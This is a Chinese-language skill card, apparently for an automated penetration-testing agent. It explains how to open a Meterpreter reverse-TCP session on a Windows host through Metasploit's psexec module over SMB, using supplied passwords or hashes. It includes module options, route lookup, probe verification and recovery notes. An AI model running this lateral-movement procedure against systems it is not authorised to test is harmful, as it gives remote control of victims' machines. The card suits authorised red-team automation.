---
name: session-msf-via-credentials
description: msfrpcd 常驻端点 — 用凭据建立 meterpreter 会话（支撑类 · provides=session）
id: session.msf_via_credentials
kind: session
runs_at: position
delivers: ["session"]
inputs: {"target_host":{"from":"graph"},"credential_ref":{"from":"graph"},"client_path":{"from":"config","optional":true},"module":{"from":"config","optional":true},"payload":{"from":"config","optional":true},"lhost":{"from":"config","optional":true},"lport":{"from":"config","optional":true},"session_wait":{"from":"config","optional":true}}
tools: ["msf","tool","cmd"]
---

# msfrpcd 常驻端点 — 用凭据建立 meterpreter 会话（支撑类 · provides=session）

卡片 ID：`session.msf_via_credentials`。

## 何时用

目标为 Windows 主机，SMB/445 可达，已有可用凭据（口令或哈希）。执行点为 Kali 标准工具机，使用 msfrpcd 常驻端点及 RPC API；所需工具为 `msfrpcd`、`python3`、`agv_msf_rpc.py`、`sh`、`ip`、`head`。

本卡建立经探针核对的 meterpreter 会话，供后续节点复用；会话属于端点进程内状态，端点重启即丢失。只执行一条命令使用 `exec.*` 系卡；长期保活或迁移交由会话迁移卡处理。

## 怎么做

工具主路径为 msf 模块 `exploit/windows/smb/psexec` 与 payload `windows/x64/meterpreter/reverse_tcp`，二者可由已声明输入覆盖，32 位目标须调整 payload。通过端点客户端调用 RPC：`module.execute` 启动模块，`job.list` / `session.list` 查看任务与会话，再用 `session-script` 运行探针；不使用交互式 msfconsole。

本卡的调用形状就是下面这条链：route → exploit → probe，占位符按 argv 绑定：

```sh
# 未提供 lhost 时，在执行点读取路由输出的 src
sh -c 'ip -4 route get <target> 2>/dev/null | head -1'

# 模块由引擎经本机库直接起（modules.execute），选项作为一个字典交给它；无 domain 时省略 SMBDomain
# 例：{"RHOSTS":"<target>","SMBUser":"<user>","SMBPass":"<secret>","SMBDomain":"<domain>",
#      "PAYLOAD":"<payload>","LHOST":"<lhost>","LPORT":<lport>}

# 对本次取得的 sid 执行 getuid 与 sysinfo：引擎经本机库把两条动词依次送进该会话
# （session.runsingle，一次一发；不再有 <client_path> 那个发送端脚本）
```

> **这些是独立动作块**：一行一个块。多步就在一次回答里用 `{"actions":[…],"gap":1}` 批量给出（引擎按顺序执行、每块各记一条回执、块间默认歇 1 秒）；**不要把几行用 `&` 拼成一条长命令** —— 一处坏、整条废，长行还会把回执尾巴弄丢。

输入定义见 `skill.json`。`target_host`、`credential_ref` 来自图；凭据的 `user`、`secret`、可选 `domain` 分别绑定 `SMBUser`、`SMBPass`、`SMBDomain`。模块、payload、反连地址与端口、会话等待窗口来自配置；**会话认领与探针都由引擎的常驻控制台客户端负责**（本机 msf python 库），卡里不再有"执行点的端点客户端路径"这个输入。未提供 `lhost` 时从 route 输出取 `src`。

引擎轮询 `sessions.list`，按本次 `exploit_uuid` 与新出现的 sid 认领会话；超时仍无新会话则按未成记。模块、payload、LPORT 和等待窗口可按现场选定；方法层的探针选择空间不改变当前 fixed 入口，当前探针固定为 `getuid`、`sysinfo`，不增加探针输入。认领口径、探针证据要求和通道登记条件不可更改。

## 怎么判

三个阻断闸为 freshness、target、effect，`identity_rule=null`，effect 使用已注册规则 `target_echo_present`。

- freshness：核对探针调用的执行状态与 `call_id`；本通道没有 shell marker：引擎先排空会话积压，再读到输出静默为止。
- target：核对 `target_host` 与本次目标，并核对探针返回的主机名与身份归属。`target_host` 来自绑定输入；现有 target 闸按目标字段匹配，不能把该字段匹配当作探针身份已核实。
- effect：探针解析出的 `session_identity` 或 `session_host` 任一非空。只有探针应答算证据，通道登记须指向本次已应答的 sid。

证据字段为 `call_id`、`target_host`、`session_id`、`session_identity`、`session_host`，原始输出为 `stdout`、`stderr`；可核对客户端返回的 `sid=`，以及探针输出的 `Server username:`、`Computer:`。身份是否满足后续节点要求由该节点判断。

通过：三个阻断闸均为 `pass`。不满足：任一阻断闸返回 `unsatisfied`，按既有聚合规则处理；本卡的 `target_echo_present` 只返回 `pass` 或缺证据的 `uncertain`。不确定：没有阻断闸返回 `unsatisfied`，但存在缺失或不确定的证据。没有新会话时保留模块调用及 `observations`，判为 `uncertain`；模块运行完成不能单独证明会话成立。

## 异常与恢复

- LHOST 须按执行点到目标的路由确定；多网卡时猜默认路由可能把反连指向错误接口。
- 常驻端点的旧 handler 可能占用 LPORT，导致同端口无法取得新会话；换端口或先清旧 job。
- payload 位数不符可能表现为超时，不能据此认定模块未运行。
- 密码只放在 `--options` 对应的一个 argv token 内，由既有机制脱敏；不得用 base64 传密码。模板中的 base64 仅编码固定探针命令。
- 旧 payload 可能在新 handler 启动时重连，不能仅凭窗口内新增 sid 认领。旧端点不返回 uuid 时沿用窗口口径，并在 stderr 说明。
- psexec 可能出现 `Login Failed: closed stream`；无新会话如实保留 `uncertain`，重试交由 run / 编排层，本卡不自行重试。
- meterpreter 只接受自身命令；`sc query` 这类命令行**照旧写 `{"tool":"cmd","cmd":"sc query …"}`**，由引擎按位置包装并带回显（不要自己发 `execute -f cmd.exe -a "…"`：没有输出，不能作为证据）。

本卡会创建端点任务及目标会话，不能按只读操作处理；旧 job 与会话须按本次调用核对归属。端点重启会清空会话状态，保活与迁移仍由会话迁移卡处理。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
